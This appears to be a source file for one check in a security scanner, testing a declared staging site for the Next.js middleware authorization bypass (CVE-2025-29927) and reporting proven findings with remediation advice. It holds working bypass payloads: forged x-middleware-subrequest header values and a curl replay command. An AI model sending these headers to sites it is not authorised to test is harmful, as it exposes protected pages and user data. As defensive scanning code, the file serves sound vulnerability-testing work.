// next-middleware: CVE-2025-29927. Next.js before 12.3.5, 13.5.9, 14.2.25 and
// 15.2.3 trusts an internal header, x-middleware-subrequest, and skips the
// middleware when a request carries it. Apps that do their auth in middleware
// (very common on Next.js SaaS) then serve protected pages to anyone. We ask a
// few usual protected routes twice, without and with the header: denied or
// redirected without it, served with it, is the proof. GET only, declared host.

import type { Check, CheckContext, Finding } from "../core/types.js";
import { safeFetch } from "../core/net.js";

const PATHS = ["/dashboard", "/admin", "/settings", "/app", "/account", "/api/admin"];
// The header value that matches the middleware name in each Next.js layout.
const VALUES = [
  "middleware:middleware:middleware:middleware:middleware",
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
  "pages/_middleware",
];

const blocked = (status: number) => status === 401 || status === 403 || (status >= 300 && status < 400);

export const nextMiddleware: Check = {
  name: "next-middleware",
  title: "Next.js middleware bypass with x-middleware-subrequest (CVE-2025-29927)",
  readOnly: true, // GETs on the declared host
  async run(ctx: CheckContext): Promise<Finding[]> {
    if (!ctx.stagingUrl) return [];
    const base = ctx.stagingUrl.replace(/\/+$/, "");
    if (!ctx.scope.isHostAllowed(base)) return [];
    const paths = ((ctx.options["next-middleware"] ?? {}) as { paths?: string[] }).paths ?? PATHS;
    const findings: Finding[] = [];
    for (const path of paths) {
      const url = base + path;
      let plain;
      try { plain = await safeFetch(url, ctx.scope, { followRedirects: false }); } catch { continue; }
      if (!blocked(plain.status)) continue; // not protected by middleware, nothing to bypass
      for (const value of VALUES) {
        let forged;
        try { forged = await safeFetch(url, ctx.scope, { followRedirects: false, headers: { "x-middleware-subrequest": value } }); } catch { continue; }
        if (forged.status !== 200 || forged.body === plain.body) continue;
        findings.push({
          id: `next-middleware:${path}`,
          check: "next-middleware",
          title: `Middleware bypassed on ${path} with x-middleware-subrequest (CVE-2025-29927)`,
          severity: "critical",
          state: "proven",
          location: url,
          description: `GET ${path} answers ${plain.status} normally, and 200 with a different page when the request carries x-middleware-subrequest: ${value}. The auth done in middleware is skipped for anyone who sends that header.`,
          remediation: "Upgrade Next.js (12.3.5, 13.5.9, 14.2.25, 15.2.3 or later), strip x-middleware-subrequest at the edge, and check auth again in the route itself, not only in middleware.",
          proof: { method: "same GET without and with the internal header", replay: `curl -s -o /dev/null -w '%{http_code}' -H 'x-middleware-subrequest: ${value}' '${url}'`, evidence: `without: HTTP ${plain.status}; with: HTTP ${forged.status}, ${forged.body.length} bytes` },
          regressionHint: `${path} with x-middleware-subrequest must still be denied.`,
        });
        break;
      }
    }
    ctx.log(`next-middleware: ${findings.length} finding(s)`);
    return findings;
  },
};
